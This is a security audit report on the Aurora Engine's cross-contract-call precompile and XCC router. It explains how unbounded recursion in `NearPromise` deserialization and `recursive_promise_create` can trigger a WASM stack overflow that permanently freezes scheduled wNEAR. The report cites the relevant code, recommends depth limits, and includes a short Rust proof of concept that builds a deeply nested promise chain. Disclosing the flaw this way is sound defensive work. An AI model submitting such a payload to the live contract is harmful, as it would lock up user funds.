### Title
Unbounded Recursive `NearPromise` Deserialization and Execution Causes WASM Stack Overflow, Permanently Freezing Scheduled XCC Funds - (File: `engine-types/src/parameters/promise.rs`, `etc/xcc-router/src/lib.rs`)

---

### Summary

The `NearPromise` type implements recursive Borsh deserialization and recursive traversal/execution functions with no depth limit. An attacker can craft an arbitrarily deeply nested `NearPromise::Then` chain and submit it via the XCC precompile as a `Delayed` promise. If the nesting depth is calibrated to survive deserialization in the Aurora Engine contract but overflow the WASM call stack in the XCC router contract during `recursive_promise_create`, the stored promise becomes permanently unexecutable. Any wNEAR transferred to the engine's implicit address as part of the XCC setup for that promise is then inaccessible to the user through normal protocol paths.

---

### Finding Description

**Root Cause 1 — Recursive `BorshDeserialize` for `NearPromise` with no depth limit:**

The `NearPromise` type implements `BorshDeserialize` by hand because it is a recursive type. The `Then` variant calls `Self::deserialize_reader` recursively with no depth guard: [1](#0-0) 

A user-controlled Borsh-encoded byte stream with `N` nested `0x01` (Then) variant bytes will cause `N` recursive calls to `deserialize_reader`. There is no maximum depth check anywhere.

**Root Cause 2 — Recursive `promise_count`, `total_gas`, `total_near` traversal:**

All three utility methods on `NearPromise` are recursive: [2](#0-1) [3](#0-2) 

**Root Cause 3 — Recursive `recursive_promise_create` in the XCC router with no depth limit:**

The XCC router's `recursive_promise_create` function recurses into the `base` of every `NearPromise::Then` node: [4](#0-3) 

There is no depth counter, no iterative rewrite, and no guard against arbitrarily deep chains.

**Entry Point — XCC precompile accepts user-controlled `NearPromise` input:**

The `CrossContractCall` precompile deserializes the full `CrossContractCallArgs` (including the nested `NearPromise`) directly from EVM calldata: [5](#0-4) 

For the `Delayed` variant, the serialized promise is forwarded to the router's `schedule` method and stored on-chain: [6](#0-5) 

**Execution path — `execute_scheduled` is callable by anyone and triggers the recursive function:** [7](#0-6) 

`execute_scheduled` is explicitly documented as callable by anyone. It calls `Self::promise_create` → `Self::recursive_promise_create`, which recurses into the stored `NearPromise` tree.

---

### Impact Explanation

**Permanent fund freeze (Critical):**

1. An attacker (or a malicious EVM contract interacted with by a victim) calls the XCC precompile with `CrossContractCallArgs::Delayed(PromiseArgs::Recursive(deeply_nested_NearPromise))` where the promise includes a non-zero `attached_balance`.
2. The XCC precompile transfers wNEAR from the caller's EVM balance to the engine's implicit NEAR address (step controlled by `required_near` logic).
3. The serialized deeply nested promise is stored in the router's `scheduled_promises` map.
4. Every subsequent call to `execute_scheduled` for that nonce triggers `recursive_promise_create`, which overflows the WASM call stack and panics. NEAR reverts the state of that call, so the promise remains in storage permanently.
5. The wNEAR transferred to the engine's implicit address in step 2 is inaccessible to the user through any normal protocol path — the only entity that could recover it is the engine owner via privileged admin operations.

The `NearPromise::And(Vec<Self>)` variant further allows exponential branching, making the overflow achievable with a compact byte payload.

---

### Likelihood Explanation

**Medium.** The attacker must:
- Craft a Borsh-encoded `NearPromise` deep enough to overflow `recursive_promise_create` in the router WASM environment but shallow enough to survive deserialization in the Aurora Engine WASM environment (two different WASM stack budgets). This is calibratable offline.
- Have (or trick a victim into having) wNEAR approved for the XCC flow.

The XCC precompile is a production feature reachable by any EVM user. The `execute_scheduled` function is intentionally open to any caller. No admin compromise is required.

---

### Recommendation

1. **Replace recursive `BorshDeserialize` with an iterative implementation** for `NearPromise`, analogous to the fix applied in the referenced report (replacing `_getRootNodeAndCompress` with a non-recursive version).
2. **Add a maximum nesting depth constant** (e.g., `MAX_PROMISE_DEPTH = 64`) and enforce it during deserialization and before storing a `Delayed` promise.
3. **Replace `recursive_promise_create` with an iterative stack-based traversal** in the XCC router.
4. **Validate `promise_count()` against a maximum** in the XCC precompile before accepting the input, rejecting inputs that exceed the limit.

---

### Proof of Concept

```rust
// Construct a NearPromise::Then chain of depth D
fn make_deep_promise(depth: usize) -> NearPromise {
    let leaf = NearPromise::Simple(SimpleNearPromise::Create(PromiseCreateArgs {
        target_account_id: "victim.near".parse().unwrap(),
        method: "noop".into(),
        args: vec![],
        attached_balance: Yocto::new(1), // forces wNEAR transfer
        attached_gas: NearGas::new(5_000_000_000_000),
    }));
    (0..depth).fold(leaf, |base, _| NearPromise::Then {
        base: Box::new(base),
        callback: SimpleNearPromise::Create(PromiseCreateArgs {
            target_account_id: "victim.near".parse().unwrap(),
            method: "noop".into(),
            args: vec![],
            attached_balance: Yocto::new(0),
            attached_gas: NearGas::new(5_000_000_000_000),
        }),
    })
}

// Attacker submits this to the XCC precompile as Delayed
let payload = CrossContractCallArgs::Delayed(
    PromiseArgs::Recursive(make_deep_promise(10_000))
);
let calldata = borsh::to_vec(&payload).unwrap();
// EVM call to cross_contract_call::ADDRESS with calldata
// → wNEAR transferred to engine implicit address
// → promise stored in router at nonce N
// → every call to execute_scheduled(N) panics with WASM stack overflow
// → wNEAR permanently inaccessible to user
```

The recursive deserialization path is confirmed at: [8](#0-7) 

The recursive execution path is confirmed at: [9](#0-8)

### Citations

**File:** engine-types/src/parameters/promise.rs (L116-122)
```rust
    pub fn promise_count(&self) -> u64 {
        match self {
            Self::Simple(_) => 1,
            Self::Then { base, .. } => base.promise_count() + 1,
            Self::And(ps) => ps.iter().map(Self::promise_count).sum(),
        }
    }
```

**File:** engine-types/src/parameters/promise.rs (L125-137)
```rust
    pub fn total_gas(&self) -> NearGas {
        match self {
            Self::Simple(x) => x.total_gas(),
            Self::Then { base, callback } => base.total_gas().saturating_add(callback.total_gas()),
            Self::And(promises) => {
                let total = promises
                    .iter()
                    .map(|p| p.total_gas().as_u64())
                    .fold(0, u64::saturating_add);
                NearGas::new(total)
            }
        }
    }
```

**File:** engine-types/src/parameters/promise.rs (L178-207)
```rust
impl BorshDeserialize for NearPromise {
    fn deserialize_reader<R: io::Read>(reader: &mut R) -> io::Result<Self> {
        let variant_byte = {
            let mut buf = [0u8; 1];
            reader.read_exact(&mut buf)?;
            buf[0]
        };
        match variant_byte {
            0x00 => {
                let inner = SimpleNearPromise::deserialize_reader(reader)?;
                Ok(Self::Simple(inner))
            }
            0x01 => {
                let base = Self::deserialize_reader(reader)?;
                let callback = SimpleNearPromise::deserialize_reader(reader)?;
                Ok(Self::Then {
                    base: Box::new(base),
                    callback,
                })
            }
            0x02 => {
                let promises: Vec<Self> = Vec::deserialize_reader(reader)?;
                Ok(Self::And(promises))
            }
            _ => Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                "Invalid variant byte for NearPromise",
            )),
        }
    }
```

**File:** etc/xcc-router/src/lib.rs (L149-156)
```rust
    #[payable]
    pub fn execute_scheduled(&mut self, nonce: U64) {
        let Some(promise) = self.scheduled_promises.remove(&nonce.0) else {
            env::panic_str("ERR_PROMISE_NOT_FOUND")
        };
        let promise_id = Self::promise_create(promise);
        env::promise_return(promise_id);
    }
```

**File:** etc/xcc-router/src/lib.rs (L242-282)
```rust
    fn recursive_promise_create(promise: &NearPromise) -> PromiseIndex {
        match promise {
            NearPromise::Simple(x) => match x {
                SimpleNearPromise::Create(call) => Self::base_promise_create(call),
                SimpleNearPromise::Batch(batch) => {
                    let target = batch.target_account_id.as_ref().parse().unwrap();
                    let id = env::promise_batch_create(&target);
                    Self::add_batch_actions(id, &batch.actions);
                    id
                }
            },
            NearPromise::Then { base, callback } => {
                let base_index = Self::recursive_promise_create(base);
                match callback {
                    SimpleNearPromise::Create(call) => env::promise_then(
                        base_index,
                        call.target_account_id.as_ref().parse().unwrap(),
                        call.method.as_str(),
                        &call.args,
                        NearToken::from_yoctonear(call.attached_balance.as_u128()),
                        Gas::from_gas(call.attached_gas.as_u64()),
                    ),
                    SimpleNearPromise::Batch(batch) => {
                        let id = env::promise_batch_then(
                            base_index,
                            &batch.target_account_id.as_ref().parse().unwrap(),
                        );
                        Self::add_batch_actions(id, &batch.actions);
                        id
                    }
                }
            }
            NearPromise::And(promises) => {
                let indices: Vec<PromiseIndex> = promises
                    .iter()
                    .map(Self::recursive_promise_create)
                    .collect();
                env::promise_and(&indices)
            }
        }
    }
```

**File:** engine-precompiles/src/xcc.rs (L137-138)
```rust
        let args = CrossContractCallArgs::try_from_slice(input)
            .map_err(|_| ExitError::Other(Cow::from(consts::ERR_INVALID_INPUT)))?;
```

**File:** engine-precompiles/src/xcc.rs (L159-172)
```rust
            CrossContractCallArgs::Delayed(call) => {
                let attached_near = call.total_near();
                let promise = PromiseCreateArgs {
                    target_account_id,
                    method: consts::ROUTER_SCHEDULE_NAME.into(),
                    args: borsh::to_vec(&call)
                        .map_err(|_| ExitError::Other(Cow::from(consts::ERR_SERIALIZE)))?,
                    attached_balance: ZERO_YOCTO,
                    // We don't need to add any gas to the amount need for the schedule call
                    // since the promise is not executed right away.
                    attached_gas: costs::ROUTER_SCHEDULE,
                };
                (promise, attached_near)
            }
```
